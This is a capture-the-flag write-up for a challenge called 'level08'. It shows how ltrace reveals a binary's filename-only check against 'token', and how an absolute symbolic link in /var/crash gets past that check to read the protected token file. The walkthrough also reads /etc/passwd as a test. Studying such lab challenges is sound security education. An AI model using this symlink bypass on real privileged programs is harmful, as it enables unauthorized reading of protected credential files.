# 📜 Level08 Writeup
## Level Overview

**Category:** Binary Exploitation / File Access Restriction  

**Description:**  
We are given a binary called `level08` that reads a file passed as an argument. The flag is stored in a file named `token`.  

At first glance, the challenge looks simple: just run `./level08 token`. However, the binary has a built-in restriction that prevents directly reading any file named `token`. The exploitation path relies on understanding how the binary checks filenames and then bypassing this restriction using symbolic links.  

---

## Analysis

We begin by tracing the binary with `ltrace` to see which library calls it makes:  

```bash
ltrace ./level08
````

Observations:

* The binary calls `printf` to display usage: `./level08 [file to read]`
* It immediately calls `exit(1)` if no file argument is provided

This tells us the binary requires a filename argument.

![image2](./image2.png)

---

## Testing with the Token File

Next, we pass the `token` file directly:

```bash
ltrace ./level08 token
```

From the trace we see:

```
strstr("token", "token")
printf("You may not access 'token'\n")
```

The binary blocks access and prints:

```
You may not access 'token'
```

So, the restriction is based **solely on the filename**, not permissions or file contents.

![image3](./image3.png)

---

## Testing with Another File

To confirm, we try with a different filename:

```bash
ltrace ./level08 /etc/passwd
```

This time, the binary does not block access.

✅ Conclusion: **The restriction is only a string check for "token".**

![image4](./image4.png)

---

## Exploitation Strategy

Since the check only applies to filenames, we can bypass it by using a **symbolic link** with a different name pointing to the `token` file.

---

### Attempt 1: Relative Symlink (Failed)

```bash
ln -s token /var/crash/bokan
```

>This failed because the relative symlink pointed to `/var/crash/token`, which does not exist.
that is because ln behaves differently when you do not put the absolute path of the file to link to, it causes it to search in the same repo for the file names token and link to it if it did not exist it creates a broken link.

---

### Attempt 2: Absolute Symlink (Success)

```bash
ln -s /home/user/level08/token /var/crash/bokan
```

Now `/var/crash/bokan` correctly points to the real `token` file.

---

## Retrieving the Flag

Finally, we run the binary with the symlink:

```bash
./level08 /var/crash/bokan
```

🎉 The binary successfully reads the file and prints the flag.

![image5](./image5.png)

---

## Conclusion

* The binary filters **only by filename**, not contents.
* `ltrace` is a quick way to spot simple string checks.
* Always remember the difference between **relative vs absolute symlinks** when bypassing file path restrictions.
